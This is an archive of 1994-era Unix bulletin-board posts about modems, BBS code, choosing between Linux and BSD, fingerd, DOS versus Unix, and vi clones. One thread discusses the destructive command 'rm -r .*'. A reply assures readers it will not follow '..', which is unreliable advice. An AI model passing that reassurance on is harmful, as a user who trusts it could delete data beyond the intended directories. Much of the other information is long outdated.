one fifteenth the capacity...

If you mean a SLIP/PPP connection by 28.8 modem....not bad.  Installation 
from your point of view should be minimal.  Hell, as far as that goes, 
multiple 28.8's might be a possibility if your service provider wasn't so 
steep... Just remember; once you've got a cable strung to your house by 
Ameritech or whoever, you gotta use that line for quite some time to justify 
the installation costs....and then you gotta have a machine to use all the 
bandwidth.. Catch-22.  Gotta have the most bang for the buck on line 
charges, then you end up having to grab a machine that can handle hundreds 
of connections at once, and then.......

Sorry for the diatribe.  Just working out some frustration :)

How many providers are in your area?  At least a few with POP's around here.  
Some of them have crappy rates.  Shop around if it's at all possible....

Update me how the bit with the 28.8 modems go....I have heard inconsistent 
stuff about Rockwell and Hayes 28.8 serial flow.  Something about not being 
able to do DTE/DCE speeds over 38.4 or something...

I really haven't looked at the 28.8 route.  My first quote for 56

Term is actually pretty cool... :)   i use it....

it basically gives you everything that SLIP gives you, without
actually giving you IP.  all you need is unix on both ends....

i use it mainly for mulitple sessions....  but you can set it up to
send and recievve mail.. read news... and run X stuf over the connection

you can also redirect ports on the remote machine to yours.....  ie.

tredir remote 4000 local 23

so that ppl can telnet to 4000 on the remote machine adn get hook
to yours....   i know someone who is running a bbs over a 14.4 modem
link that way... kinda slow... but it works... :)

an ISA bus should be able to handle that pretty easily if you use serial ports
with 16550's (they are buffered, and thus will only send out an interrupt for
every x bytes received, where (1 < x < 16), which cuts down on the amount
of time spent in interrupt handlers by a ton).

even without them it would probably be able to handle it okay, there just
might be a higher load on the system.

not at this point.  In most of the places where you could get a whole bunch
of text dumped at once I've tried to run it through a pager, so that you
could stop it easily, but the message bases is one place where this hasn't
happened yet.

<slam that key> basically comes from a modified version of puts that counts
how many lines have been printed, and when it reaches a certain number it
pauses.  anytime there is input the counter gets reset, so it effectivly
puts paging onto everything.

the problem is that there isn't a way to tell the pager when one operation
started and the previous one (that you want to skip) stopped.

How about allowing one character for non-stop scrolling? (= or whatever),
that shouldn't be impossible to implement? 

I guess you reset the counter for puts at every new text that's being printed,
ie, at the same time the "nonstop" flag is cleared if you've set it
earlier? (haven't looked at the source, I'll do so when I get home to my
Linux-box...)

okay, its been done.  i'll get it out in the next client, or if you want to
do it in your own change the line in yabbs/miscutil.c that says:
fgetc(stdin); line = 1;
to 
if (fgetc(stdin) != '=') line = 1;

I'm not sure exactly how you are working this.  Do you mean 
downloading the messages or any text files?  rz/sz works pretty well once 
it's configured, but their are some places where it is not approproate.

Are you trying to add Rip support for your board or trying to get

RIP II.  
If you're trying to add RIP support I've got some info that I can give you 
or  you can get it off the Telegrafix BBS.  I think it's listed in the R
IP for Dos manuals.  There's no reason why you couldn't have RIP graphics
on a Unix BBS but you'd have to draw all you're screens from Dos.
The only hard part would be adding the auto detection.

i think getch() in C, and cin.get() in C++ will do the job for char-
by-char input. and then a while ((ch=cin.get())!='\n); to kill the
rest of the line...
   cout.put(char ch) will output a char at a time in C++, is it

Here we go...draw the battle lines....its a religous flame war waiting to 
happen...;)

Seriously, there really is not one "better" or "best" UNIX out there.  It
all depends on your taste and preference.  Also, what you want to do has
alot to do with what version/flavor UNIX you should use.

Linux....not a bad flavor at all.  Highly supported by its users and has 
plenty of add on features and all the standards of a sysv type unix.  
Problems:  It caters to the low end market...ie, people who come from a 
non UNIX background like dos.  ITs install is painlessly easy but they 
bundle everything under the sun with the kernel and all the utilities.  
Most of the time, I have spent stripping the not needed crap out of my 
kernel when I use it.

FreeBSD:  VERY solid, excellent PC unix.  Ask HT about it as well.  ITs 
about the same, not as much user support(ie, there arnt hundreds of kid 
son IRC to help you out), but the newsgroups and mailing lists take care 
of 98% of the problems you may encounter.  It is not intended for the rank 
novice though ;)  Its install is easy if you can read and follow 
directions but there is no nice menu system or other stuff.  It has about 
the same number of utilities etc...but they are not included in the base 
install...you need to get them from the ports and packages directorys.

To get either....FTP to:  Linux ---> sunsite.unc.edu
                          FreeBSD ---> freebsd.cdrom.com

Have fun.

i don't think that it has been ported to unix.  last time i checked it was
available for os/2 and ms-dos.  it comes with c source code, so you could
probably hack something out, although you'll probably be better off grabbing
something like yabbs (or any other unix bbs software) that was designed for
unix and use that.

you might look at the unixbbs faq...ftp rtfm.mit.edu and look in pub/usenet

Aye m8, SCO is not a very useable UNIX from my point either.  Anything 
that costs around 1500 for a version with a C compiler with no source is 
not worth my time.  I personally cant stand Linux, just cant use it 
without tearing my hair out.  But Ill grant you the community stuff.  Its 
free, it has source and its supported by better folks than any damn 
wankers at a tech support hotline.  Although most linux users(#linux) 
strike me as a group of clueless idiots...mind you I am not talking about 
any one in specifics, mainly what I can witness on various forums 
discussing linux etc... Many of my friends and highly respected 
individuals swear by it.  Preferences vary, deal with it.

I personally am one of those "old school, techie hacker types" that use 
BSD.  I mainly come from a system v background, have run many variants of 
sysv on many different platforms and have had no qualms, but BSD is still 
my #1 choice for a UNIX os.

I mostly use man pages and whatever cool source I can find on the net.  For
instance when writing yabbs I learned sockets by poking around in some
socket stuff I found on the net (telnetd a lot, other stuff a bit), reading
man pages, and for my first intro to them going to the library at school
and photocopying a 10 page intro to sockets.

I would highly reccomend a copy of "The Design and Implementation of 4.3BSD"
though.  It is pretty much the only computer book that I've kept in my 
collection since I've owned it, along with K&R (new testament).

If you don't like man pages apparantly O'Reilly is making books of pretty much
all of the 4.4BSD man pages, so you might invest in them.  Gopher to
gopher.ora.com and look around there.

Yep, this aproach works quite well, I am in the process of "negotiating" 
some sort of laptop/portable UNIX machine right now.  Some sort of

Two were CAD stations (one has a 17" monitor), and ther third was the file 
server. They don't need them any more, and no school in the area will take 
them, so if I'm lucky, I might be able to get them as "salvage" for 3 
cents a pound.
Right now they're running some bizzare proprietary OS (I truly have no 
Idea what it is, but it has a pascal compiler), but mayhaps I can install 
HP/UX on them and SLIP them to the unieversity.

I asked the sysadmin at my school, he said he got a magazine every month
that listed used stuff for sale, and would save the next copy for me.
He also asked that I not steal one of theirs. :)
also: DUMB SYSADMIN ACTION OF THE MONTH
they replaced /usr/bin/finger with a script that doesn't start with
a #! /bin/sh or anything, so when fingerd tries to exec() it, it fails.
I wrote the sysadmin in charge of that stuff, but she has failed to 
respond.  Can't believe some of these people get paid real money
for extreme incompetence.  (At least I figure if they can get a job,
I will have no problem :) )

how would one go about removing (and deleting all the files from) all 
directories that begin with a period? "rm -r .*" would wipe everything the 
user was authorized to wipe from the disk as far as i can tell (by 
deleting . and .., and everything beyond ..).  "rm -r .??*" would solve 
that problem but what if there was a dir called ".a" ? I don't even know 
if this is possible with one command but someone asked me and got me 
curious.

re: Stupid sysadmin action of the month.

Heh... Well, a lot of sysadmins by colleges and universities don't have 
much time to spend working on network connections. A lot of the time is 
spent getting library stuff to work right, and stuff along those lines. 
That's assuming they're even paid to be there full time. A few sysadmins 
of colleges that I know are paid part time, while a bunch of incompetent 
assistants work full-time. Real sysadmins and netadmins that know what 
they're doing and work well get paid a lot. 6-digits, where the first 
digit is often a multiple of 3.. :) But ignoring it when someone's nice 
enough to tell you about it is really bad, since you can lose data or 
something that sue the sysadmin, since you notified that person. The good 
way to get through, send a cc: to their boss.

On the other hand, I've seen many people be accused of trying to take the 
network down, when all they were doing was reporting a bug. Some sysadmins 
think that anyone that knows the first thing about a network topology or 
something must be a hacker or something. *shrug*

I'm pretty sure invoking 'rm -r .*' doesn't delete '.' or '..'. These 
filenames are usually only deleted when you create or remove a directory. 
But test before you try that. rm -r .* should delete all files and 
directories that are hidden using the .*, providing you have control over 
those files/directories.

I have a question about additional arguments that need to be passed
to certain daemons that are started from inetd.  For something such
as fingerd, how does the user argument get passed to it?
Does it try and read a line of text from the socket containing args?
when you finger user@host.domain, does your finger pass
'user\n' down the socket?  if that is the case, then does it pass
'\n' down if you 'finger !host.domain'
I've tried looking in a few books, and the man pages, but they didn't
have quite what I was looking for.  Thanks for any tips.
(woops , 3 lines up should read @host.domain)

inet runs a program called fingerd, not finger.  fingerd just reads 
stdin and takes the first line of it, passes that as an argument to finger,
and exits when finger is done.  inetd handles redirecting the socket as
stdin/stdout for fingerd.

You can get source code for all of bsd from a number of sites.  Look around
on ftp.uu.net for the BSD Net/2 source, or freebsd.cdrom.com in 
/pub/FreeBSD/FreeBSD-current/src/libexec/fingerd for the fingerd source
from FreeBSD (which is he same as the fingerd source in Net/2).

Subject: winnt vs unix
Date: Wed Jun 15 20:34:51 1994

I won't even justify Windows enough to consider it as a usable system.
However having used unix (and unixlike systems) extensivly, and now using
Windows NT at microsoft for my work here are a few of my impressions as
to plus and minuses of each:

Windows NT:
 pluses:
  - user interface is easier at first
  - windows networked file systems are a lot easier to setup/use than
    NFS (which is the most widely used unix networked file system).
  - user interface is more consistant
  - tons of apps work with it (and lots of good ones, like MS Word)
  - much better kernel design (microkernels are the way of the future).
 minuses:
  - it isn't very customizable.  for instance I hate title bars, I'd rather
    have the extra screen space for my own use.  not possible on NT (without
    hacks).
  - everything i do is done on my machine.  i can't telnet to other machines
    to remotely use them (but i can mount there disks if i just need to get
    to data on them).  In addition my email can only be accessed on it, 
    and all of my code is kept there.  not really distributed, the way 
    unix can be...
  - with the default setup it is easy for a user to fuck himself.  just
    go remove the wrong file and your system is hosed (on unix most of
    the files on the disk are r/w for root only).

Unix:
 pluses:
  - remote connections are cool (how do you think you get to yabbs :))
  - i can customize the hell out of my interface (under X I can use whatever
    window manager I want, any shell, whatever).
  - killing the system (unless you're root) is difficult to impossible.
 minuses:
  - the kernel design really is bad...monolithic just doesn't make sense
    anymore.  and i shouldn't have to recompile kernel to add/remove device
    drivers
  - much harder to learn in the first place

In general unix makes much more sense for a multiuser system, Windows NT
just wasn't designed to be that.  However Windows NT is a nice desktop
OS, esp in a corporate environment.

Also in general people can run unix on a lesser machine.  BSD and Linux
are both very reasonable on a 386/33 with 8megs, but Windows NT really
needs a 486/33 and 16 megs minumum (3.1 isn't too useful with more, but
3.5 (which will be out soon) is much better with respect to memory).

okay, anyway:

DOS is a program loader for the most part ... its not ment to be a full-blown
OS, and it doesn't do a damn good job of it IMHO

Windows is a program loader with pretty pictures.  Agreed the standard user
interface makes it much easier to figure out programs ... but once you leanr
the program it can actually slow you down.

Haven't played with NT too much, but the copy my friend got off his CD-ROM
ate itself several times.

They all have advantages and drawbacks ... but just off hand i can tell you 
i wouldn't have gotten my job this summer if i hadn't had all my UNIX
experience.  Not matter what the future direction may be i'm personally 
happy sticking with the system that I find most powerful NOW.

Sorry, just gotta throw in my $.02

What have you been smoking?
I could recount all the points everyone else has made but that seems 
rather redundant so i'll try and be sort of original here (try i say:)

I think it's important to remember that DOS was originally designed on a 
UNIX box and that means it's is less than unix, also, in the past years, 
DOS has been moving _closer_ to unix (file handles, the command structure, 
hardware interfaces, etc...) and since windoze runs on top of DOS, that 
means it is also a less than unix.
 
As for OS/2, i'll say it is nice when you got the presentation manager 
open, but remember OS/2 also has a CLI, making it very much like unix with 
the option of CLI or X.  And if you want to run X remotely, you can
 get remote X clients, (which is a lot more economical than getting OS/2 
and mounting a remote drive on the desktop)

And like htoaster pointed out, if the others are so much better, then how 
come UNIX achieves similar results with so much less overhead?

Mind you, i have nothing against a good GUI, but so far, the only one i 
(ones that is) think are mature enuff are X and OS/2, and OS/2 still 
requires immense resourcews (unless you are comparing it to NT;)

Yes, I think I agree with you, on that view but, you didn't really 
consider the reliability aspect of unix versus Windows NT, or also the 
fact that code written under dos or windows suffers from the architecture 
being very recursion unfriendly. 

Another point to consider would be the scalability of unix i.e. it runs on 
everything to super computers, with vastly differing architectures, I 
think dos would find it very difficult to handle a full vector processor.

Ok UNIX is unfriendly, unless you want to use X, or some front end, but 
you have to remember it wasn't designed in the days that the word gui 
could be used to non-tech people and they might have a chance of knowing 
what you mean.

To be honest I prefer the horses for courses approach, i.e. client server 
networks, with p.c. where necessery running X, far nicer.

No i'm not saying that it's impossible for the system to improve over 
time, but DOS has only been around for about 15 years now and the hardware 
didn't really improve enuff to support vast improvements in the OS until 
the mid 80s when we got to the AT
What i'm saying is there has been insufficient time for dos to improve and 
as of yet, it's still trying to copy unix but only partially which means 
it is still less of an OS

that there has never been any real competition to good ol' dos so there 
was subsequently no reason for them to change it...... the increasing 
popularity of dr.dos (now knows as novell dos) promppted microsoft to 
bloat their dos equally, with all sorts of idiotic  disk compression 
utilities and things.... now microsoft sees some REAL competition 
_starting_ to appear (os/2, taligent(vaporware), mabye some unix(who 
knows?) so they have been forced to get off their butts and slap together 
windoze nt and chicago. oh, and to your point about ms wanting dos to look 
like unix, that's ridiculous... microsoft wants everything they sell to be 
easy to use for the moron market (did any of you see the mouse tutorial in 
windoze 3.1? sheeeeeeesh) and unix ain't exactly known for being 
luser-friendly....

Yes, and the reason OS/2 is a real OS is because they didn't model the OS 
after another operating system.  DOS is still trying to be a half-assed 
unix
And i didn't say _look_ like it, i said it is like it.

The DOS interface (low level, like int 21h calls, etc) is very much so 
like UNIX.  It started out being more like CP/M and as the hardware 
progressed it has adopted UNIX things.  For example the use of file 
handles, and getting away from doing everything with BIOS calls

argh...

everyone go learn your unix api's and dos api's and come back then...unix
and dos are completely different designs...yes, dos adapoted the tree structed
file system of unix, but that is about it...the way the two file systems are
laid out on disk is totally different...

if you really want to have this argument i'd reccomend going to your local
university library and getting a book on operating system design...i
personally like "Modern Operating Systems" by Tanebaum (spelling?).  in the
back it has a history of both ms-dos and unix (and cooler stuff like mach),
so read those...

btw, the main problem with dos is that it wasn't designed to scale to todays
computing systems.  its memory managment is designed around the segmented
architecture of 8086's, not the paged systems that most current processors
use (or the paged-segmented system of the 386/486).  pointers are usually
kept in reference to the local segment, and segment sizes are 64k, which makes
dealing with more memory more of a pain (yes, FAR pointers work around that)...
and it just doesn't have a no-brainer interface to accessing more than 640k
of memory.

my last comment on the subject of dos vs. unix:  I'm not saying that DOS 
attempted to adopt the file sturcture of unix either, i'm saying the 
interface (ie, using streams instead just i/o directly to and from buffers 
and the relatively new adition of share.exe which now allows you to do 
file locking just as in unix, in fact, you even use the same functions...)

But my real question is, can you install FreeBSD on MCA? (or did i already 
ask that...hrmmm)

NCR still makes those MCA machines too...we have a couple of multiprocessor

I think IBM licensed MCA to whoever wanted it, but the industry just turned

Actually, no, IBM charged royalties or at least a one time licensing fee 
forMCA, and it was _steep_.  That's why so few bought into it, however, 
NCR, being the type of ppl they are had to have the best.  And they make 
some really hot boxes...Wish i had one of those multiprocessor 486s 
(didn't know they were in on the alpha market tho)
EISA was an attempt by the 3rd party comp mfgrs to turn around and say 
see, we don't need MCA, go to hell

Anyhow, don't YELL, SOME PPL FIND it very annoying

No reason not to go with PCI, even with a DX4 100, MCA is just getting up 
there to PCI/VLB throughput rates.
Really, there's no reason not to, i think the only thing that's
 beeng IBM from going with EISA is that it's really just a kludge and is 
still very much ISAish underneath.
With an open , fully arbitrated bus with guaranteed throughput on each and 
every channel at once, there's no reason not to.  Plus i think they've 
learned the value of an open standard.

I think something like 40 megs or so.  Depends on what you want to do 
with it.  A basic BSD UNIX system without X can survive on a pretty small 
partition/disk.

I had to redo my whole system due to a work related project that requires 
me to work in dos/windows... :(

I allocated 200 MB for Dos/Windows and 300MB for FreeBSD/X
I then use OS-BS to boot whichever one I need to work under.

It'll fit in 40 (like cosmos said), but I'd reccomend at least 80 for a 
working installation (ie, something you really want to use).  If you want
X you'll probably want at least 120 for it.

I personally run this machine with about 500 megs of disk (right now), 
but 75 megs of that is for swap space.  At the end of the summer it'll
probably have between 750 and a gig depending on how much i feel like spending.
Most of it isn't for the base system though (yabbs takes up about 30,
X is about 30, my /usr/local is about 60, and user accounts take up about 100).
I also try and keep about 100 megs free as scratch space.

I personally love vi for editting code (and everything).  It has a steep
learning curve, but I find that it is time well spent.  Everyone I know
who now use vi won't go back to anything else.

If you really want a turbo C like editor you could remap emacs (or microemacs) 
to use the same keybindings as turbo C (I did this with microemacs once
to make it like norton editor (ne)).

You might want to check out joe as well, it is pretty much like turbo C
now...

once you get used to it, its small and fast and all the keys make sense

There are a few.  The CMU PC-IP stuff comes with one.  You should also look

Yeah, I had done this at one point.  Easy kludge, but I lost the XT to 
our secretary here and its really only a kludge workaround IMHO.

I also need to connect *all* of the over 300 IBM 486 machines on our 
token ring network to the network with a reliable means.  I did at one 
point argue to all hell with my bosses over token ring vs ethernet and I 
lost.  I also got chastised for foul language.  Go figure.

IBM cut us a deal on our rs6ks and the token ring.

I want to get a decent driver written for BSD so I can set up a nice BSD 
subnet.

the cost is really <$100 if you look around for some used twisted pair
ethernet cards (they are usually easy to find at computer shows)...and the

token to ether bridges are pretty common...if you just route ip traffic
headed for the ether machine(s) over the bridge then it is unlikely that you'll
loose to many packets...  also, all networking protocols are designed around
lans that drop packets anyway, so instead of buffer it just drops, which forces
resends...its not as evil as it sounds...

Subject: UNIX info sheet
Date: Sun Jul 31 14:00:24 1994

Alot of the kids have been asking me what version of UNIX they should run 
on their computer to learn or be cool or whatever.  Rather than repeat 
myself over and over or perhaps tear them a new arse I thought a short 
info file on the 3 variants prevailing in the free net implementations 
would be useful.

This document is in no way official or meant to be taken as gospel.  This 
is just my observations.


         ***  The Berkeley Camp  ***


There are 2 variants of the original 386BSD port done by William Jolitz 
on the net today.  Both are *very* similar in general appearance and 
contain alot of the same code, however are targeted at a much different 
audience.

The BSD implementations of UNIX are a very popular flavour in the 
university community and have been for the past 10 years.  Many 
commercial flavours such as SunOS are BSD based.

The 2 net implentations are not beginner oriented per se.  Both are aimed 
at a more knowledgeable UNIX base and do not specifically cater to the 
new or inexperienced user.  This is not to say that a new user cannot do 
anything useful on a BSD variant, just that his hand may not be held very 
closely.

If you have experience in a commercial UNIX environment, especially SunOS 
or Ultrix you may notice little difference besides vendor crap between 
your variant and the *BSD versions.

FreeBSD:  This is the intel specific release of BSD.  It relies on a core 
team for its major development.  Install is easy to follow and well 
documented for new users.  Numerous mailing lists serve the FreeBSD 
community and the freebsd.cdrom.com FTP site contains much to keep a 
FreeBSD user happy.  The FreeBSD team maintains a "package" site there as 
well which are precompiled binaries for many useful programs and 
utilities.  I recommend this one heartily to someone wanting to do some 
quality work on a rock solid UNIX os.

          Currently the last release version was 1.1.5.1 which is still 
based on 4.3 net/2 code.  You can get this release from 
gatekeeper.dec.com in the /BSD directories.  Release 2.0 which will be a 
4.4 lite based implementation is due out in late September.

NetBSD:  This is an architecture independent release of the 386BSD code.  
It runs on many popular machines like the intel 386/486, Macintosh, 
Amiga, Sun3 etc...   It is currently a working implementation of BSD 4.4 
code and within a week or two release 1.0 will be out.  This is *not* the 
beginners OS.  The only thing you get with this baby is the OS itself.  
No ports or packages are maintained, thus the need for a more in depth 
knowledge of software porting to UNIX and admin skills are needed.  I 
like this release of *BSD the best.  If you like hacking around on UNIX 
and feel comfortable, I urge you to give this one a try.



         ***  Linux   ***


Linux is an entirely different beast.  The BSD variants are technically a 
real UNIX, they do have original UNIX code in them (which has upset many 
a Novell/USL lawyer). however Linux is a complete rewrite from the ground 
up based to look like a System V UNIX.

Lets first clear up some myths.  LINUX is not System V UNIX.  LINUX is 
not UNIX period.  Linux is a very stable UNIX clone which attempts to 
give the user a System V feel with alot of BSD add ons.  

Linux has quite a few non standard quarks specific to itself that may 
confuse and/or piss off a UNIX regular.

However, Linux is written and maintained with a user-oriented attitude 
that serves its community quite well.  From the initial install program 
which is a color menu driven install more user friendly than the Windows 
install to each individual package, Linux is clearly user oriented.

Linux Slackware distribution is very well documented and contains 
*everything* under the sun you would ever possibly need/want(much too 
much sometimes ;) ).  This is one of its major differences from the older 
BSD crowd.  

It is much eaiser to a newbie or novice to install Linux, fire up X and 
start learning than on one of the *BSD variants.  But it has its 
tradeoffs.  

You can grab Linux stuff from:  sunsite.unc.edu  /pub/Linux



The bottom line is that each user must make a choice and go from there.  
Try all three and see which suits you best.  But dont expect someone else 
to spoonfeed you the whole way.  Man pages do have a reason for their 
existance...

It was for Release 1.1 but not for the latest 1.1.5.1 due to very limited 
time constraints.  You wont be able to buy one anyhow.  Time is up and 
the net/2 limit is in place.  You can only FTP it at this point from one 
of the mirrors like gatekeeper.dec.com

2.0 will be out in september and it *will* be put on a CDROM.

I don't beleive that there are any.  It works in the pvga1 driver for mono if
you don't mind having mono X.  mono 1024x768 is more useful than 640x480 16
color at least.

WD can't seem to standardize on one hardware interface to their boards and
that looses out for them.

did you get it with a gateway by any chance?  my roommate got the same bum
deal, and couldn't even trade it up, because all of their boards are just

We decided just to write to the writer of the other two wd drivers and see 
if there were any plans for the 33.
And we've got it in 800x600 (altho in our XConfig, it clearly states 
640x480, but it has to be 8x6, there's no way 640x480 is that crisp) with 
16 colors.
And i agree, you'd think that they'd be nice and make the chipsets fairly 
compatible.

well, under NT it would be easy to make it run as a console app.  Under
regular windows there are libraries which will bring up a console-like
window and let you just use printf, etc to write and read to them, so 
doing a port to that isn't too tricky either.

How about using the WATTCP stack.  It would need a packet driver, but 
over SLIP it might be kinda neat.  It should be real easy using WATTCP.

like I said, I'm not personally going to do any ports (since I don't even

i am looking for a way to get a uudecoder for unix that can piece together 
multipart encoded files.  if anybody knows of one could you either tell me 
about it or email it to me, but not in parts though.  :)

Thanks alot

i saw a program that did something to this effect a while ago....
it was a filter that stripped out lines that weren't part of the uuencoded
file... so you'd just type eke file1 fil2 fil3 file4 |uudecode
oh, it was called eke and i think it was posted to comp.sources.something 
a while ago.....

This is sort of unix related, so i thought i'd post it here for all us ppl 
stuck with dos (hopefully not for long)

vnelvis:  a must have!
It's vi for DOS, it just kicks ass, no if ands or buts about it.
and the cool thing is, it's real vi, right down to swapping in and out of 
a tmp file, so that there's just about no limit on file size, unlike 
EDIT.COM or QBASIC /edit
[same thing]
And it's in color.
It's just darn nifty, i like it.
[Pulled up a 640K doc on my 386sx 20 in about a minute, under 
windoze....that's faster than it takes EDIT to find out that it's out of 
memory:)]

vnelvis?  don't you just mean elvis?

anyway there are some differences, like the way it handles backspace (you
can backspace beyond the start of your insertion over tabs)...and elvis
doesn't wrap long lines, you have to scroll the screen (might annoying)...

if you have a unix box check out nvi...it is the coolest vi ever (and will
probably end up the new standard for vi)...multiple windows, etc...

vnelvis is an adaptation of elvis. and the only one i could find for the 
PC
and i agree, it is missing somethings/non-standard [like no :set nu :/]
Also, i meant to add that it only took about 12 seconds to bring up that 
same file in DOS [running in windows with fg priority set to 100]

you can get straight elvis for the pc...i think it is on wuarchive.wustl.edu
in /systems/msdos/editors...

there is another really nice clone their too, but the name escapes my head
now...much "closer" than elvis to the real thing...

not offhand, but if stevie can compile for the mac, chances are xvi can as
well (it was started from the stevie sources).  its a closer clone to vi
than stevie is, and has some other cool features (multiple windows mostly).
i use it on windows nt now because it was the easiest thing to make look like
nvi. (which i would like to do a true port of someday).

even easier with a curses library, which there are tons of for dos.  biggest
pain is dealing with dos memory management...and getting the original vi
sources, since you need a usl unix site license for them...

nvi would be a bit more of a bitch, since it is a lot bigger (and thus would
be even harder to work into dos's sucky memory management).

none are the original...elvis, vim, stevie, etc, but not the orginal vi...

there are differences...some don't even have stuff like :map and :map!...or
do cutting and pasting wrong...

yup, and that's what it does, it strips off sigs, headers et al and then lets 
you run it through a pipe....

if all he wanted was something for straight multipart files just 
cat file1 file2 file3 file4 filen |uudecode

uh...
so what you would do is take several files [which were segmented into 
multiple files] and put them into _one_ file
then take that one file and run it thru the magic decoder ring & have it 
spit out the uudecode files in one bin & the headers & such in  another?
